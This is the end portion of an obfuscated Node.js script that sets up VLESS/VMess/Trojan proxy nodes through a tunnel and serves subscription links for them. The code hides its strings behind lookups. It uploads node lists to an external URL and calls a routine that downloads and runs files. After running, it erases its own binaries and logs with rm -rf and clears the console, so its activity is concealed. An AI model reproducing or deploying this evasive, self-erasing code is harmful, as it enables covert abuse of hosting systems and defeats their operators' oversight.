extractDomains();}catch(_0x47614c){console['error'](_0x1e94f5(_0x5f4e68._0xb2dd7c)+_0x47614c);}}}catch(_0x41497d){console[_0x1e94f5(0x1fd)](_0x1e94f5(_0x5f4e68._0x2aab96),_0x41497d);}async function _0x4675bd(){const _0x305f84=_0x1e94f5;try{const _0x2976bb=await axios['get']('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x2976bb[_0x305f84(_0x2b7746._0x944818)]&&_0x2976bb[_0x305f84(0x215)][_0x305f84(_0x2b7746._0x8407a0)]&&_0x2976bb['data']['org'])return _0x2976bb[_0x305f84(0x215)][_0x305f84(0x205)]+'_'+_0x2976bb[_0x305f84(_0x2b7746._0x944818)]['org'];}catch(_0x512306){try{const _0x24403b=await axios[_0x305f84(0x20a)](_0x305f84(_0x2b7746._0x376efe),{'timeout':0xbb8});if(_0x24403b[_0x305f84(_0x2b7746._0x944818)]&&_0x24403b[_0x305f84(_0x2b7746._0x944818)]['status']===_0x305f84(_0x2b7746._0x2ff953)&&_0x24403b[_0x305f84(_0x2b7746._0x1cdb65)][_0x305f84(0x19f)]&&_0x24403b[_0x305f84(_0x2b7746._0x226d08)][_0x305f84(_0x2b7746._0x5c3350)])return _0x24403b[_0x305f84(_0x2b7746._0x7e406a)][_0x305f84(_0x2b7746._0x33ceb4)]+'_'+_0x24403b[_0x305f84(0x215)][_0x305f84(0x1e0)];}catch(_0x488717){}}return _0x305f84(_0x2b7746._0x43152f);}async function _0x2f7b2f(_0x3933a0){const _0x347448={_0x561dff:0x223,_0x1926df:0x223,_0x1862b6:0x1de,_0x55efbf:0x1e5,_0x3e08b7:0x180,_0x4c88b5:0x219,_0x5a1f55:0x22d,_0x2181d6:0x222},_0x4e5fd1=await _0x4675bd(),_0x2aa535=NAME?NAME+'-'+_0x4e5fd1:_0x4e5fd1;return new Promise(_0xd0d7c0=>{setTimeout(()=>{const _0x48535f={_0x55e292:0x182,_0x30d839:0x1cc},_0x5e8f0e=_0x1253,_0x4406ee={'v':'2','ps':''+_0x2aa535,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5e8f0e(_0x347448._0x561dff),'net':'ws','type':_0x5e8f0e(_0x347448._0x1926df),'host':_0x3933a0,'path':_0x5e8f0e(0x1d5),'tls':_0x5e8f0e(_0x347448._0x1862b6),'sni':_0x3933a0,'alpn':'','fp':_0x5e8f0e(0x1b9)},_0x3bd58d=_0x5e8f0e(0x1d7)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x3933a0+_0x5e8f0e(0x22d)+_0x3933a0+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2aa535+'\x0a\x0avmess://'+Buffer[_0x5e8f0e(0x222)](JSON[_0x5e8f0e(0x193)](_0x4406ee))[_0x5e8f0e(_0x347448._0x55efbf)]('base64')+_0x5e8f0e(_0x347448._0x3e08b7)+UUID+'@'+CFIP+':'+CFPORT+_0x5e8f0e(_0x347448._0x4c88b5)+_0x3933a0+_0x5e8f0e(_0x347448._0x5a1f55)+_0x3933a0+_0x5e8f0e(0x179)+_0x2aa535+'\x0a\x20\x20\x20\x20';console[_0x5e8f0e(0x20e)](Buffer['from'](_0x3bd58d)['toString'](_0x5e8f0e(0x182))),fs['writeFileSync'](subPath,Buffer[_0x5e8f0e(_0x347448._0x2181d6)](_0x3bd58d)[_0x5e8f0e(0x1e5)]('base64')),console[_0x5e8f0e(0x20e)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5e8f0e(0x20a)]('/'+SUB_PATH,(_0x36dfc5,_0x5afd47)=>{const _0x46bd55=_0x5e8f0e,_0x5d38ba=Buffer['from'](_0x3bd58d)[_0x46bd55(0x1e5)](_0x46bd55(_0x48535f._0x55e292));_0x5afd47[_0x46bd55(_0x48535f._0x30d839)]('Content-Type','text/plain;\x20charset=utf-8'),_0x5afd47['send'](_0x5d38ba);}),_0xd0d7c0(_0x3bd58d);},0x7d0);});}}async function uploadNodes(){const _0x584745={_0x18347f:0x1da,_0x113d91:0x23b,_0x3db0f9:0x20e,_0x3707f4:0x1fa,_0x3f779c:0x1af,_0x46e2a6:0x23c,_0x31bc79:0x173},_0xfb2e17=_0x54da08;if(UPLOAD_URL&&PROJECT_URL){const _0x1d6d7f=PROJECT_URL+'/'+SUB_PATH,_0x3f4e32={'subscription':[_0x1d6d7f]};try{const _0x1e98ad=await axios[_0xfb2e17(0x1a7)](UPLOAD_URL+_0xfb2e17(0x1dd),_0x3f4e32,{'headers':{'Content-Type':_0xfb2e17(_0x584745._0x18347f)}});return _0x1e98ad&&_0x1e98ad[_0xfb2e17(_0x584745._0x113d91)]===0xc8?(console[_0xfb2e17(_0x584745._0x3db0f9)](_0xfb2e17(_0x584745._0x3707f4)),_0x1e98ad):null;}catch(_0x45979d){if(_0x45979d[_0xfb2e17(0x17c)]){if(_0x45979d[_0xfb2e17(0x17c)][_0xfb2e17(0x23b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xfb2e17(0x19e)](listPath))return;const _0x2ae77e=fs[_0xfb2e17(0x18b)](listPath,_0xfb2e17(_0x584745._0x3f779c)),_0x37337b=_0x2ae77e['split']('\x0a')['filter'](_0x421f35=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xfb2e17(0x1f8)](_0x421f35));if(_0x37337b[_0xfb2e17(_0x584745._0x46e2a6)]===0x0)return;const _0x81b1ba=JSON['stringify']({'nodes':_0x37337b});try{const _0x21344a=await axios[_0xfb2e17(0x1a7)](UPLOAD_URL+_0xfb2e17(_0x584745._0x31bc79),_0x81b1ba,{'headers':{'Content-Type':_0xfb2e17(_0x584745._0x18347f)}});return _0x21344a&&_0x21344a['status']===0xc8?(console[_0xfb2e17(0x20e)]('Nodes\x20uploaded\x20successfully'),_0x21344a):null;}catch(_0x3b5d19){return null;}}else return;}}function cleanFiles(){const _0x3e800a={_0x10cf6c:0x20f,_0x4d20ae:0x186,_0x2e6b02:0x21f},_0x919e5c={_0x15f5ba:0x209,_0x386b2d:0x1fc};setTimeout(()=>{const _0x285088=_0x1253,_0x4ece20=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4ece20[_0x285088(0x1cb)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4ece20['push'](phpPath);process[_0x285088(_0x3e800a._0x10cf6c)]==='win32'?exec(_0x285088(0x1cd)+_0x4ece20[_0x285088(_0x3e800a._0x4d20ae)]('\x20')+_0x285088(0x1fb),_0x214ebd=>{const _0x238eca=_0x285088;console[_0x238eca(0x209)](),console[_0x238eca(0x20e)](_0x238eca(0x1fc)),console['log'](_0x238eca(0x1d2));}):exec('rm\x20-rf\x20'+_0x4ece20[_0x285088(0x186)]('\x20')+_0x285088(_0x3e800a._0x2e6b02),_0x30e2aa=>{const _0x122d0a=_0x285088;console[_0x122d0a(_0x919e5c._0x15f5ba)](),console['log'](_0x122d0a(_0x919e5c._0x386b2d)),console['log'](_0x122d0a(0x1d2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5a5255={_0x4dd149:0x23a},_0x24c094=_0x54da08;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x24c094(0x20e)](_0x24c094(0x237));return;}try{const _0x1e5d93=await axios[_0x24c094(0x1a7)](_0x24c094(0x1a4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x24c094(0x1da)}});return console[_0x24c094(0x20e)](_0x24c094(_0x5a5255._0x4dd149)),_0x1e5d93;}catch(_0x55856d){return console[_0x24c094(0x1fd)](_0x24c094(0x1ab)+_0x55856d[_0x24c094(0x21a)]),null;}}async function startserver(){const _0x4a3319=_0x54da08;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3fe156){console['error'](_0x4a3319(0x1b3),_0x3fe156);}}startserver()[_0x54da08(0x1b2)](_0xd48826=>{const _0x29fb4f=_0x54da08;console[_0x29fb4f(0x1fd)](_0x29fb4f(0x210),_0xd48826);}),app[_0x54da08(0x1a1)](PORT,()=>console[_0x54da08(0x20e)](_0x54da08(0x1b7)+PORT+'!'));
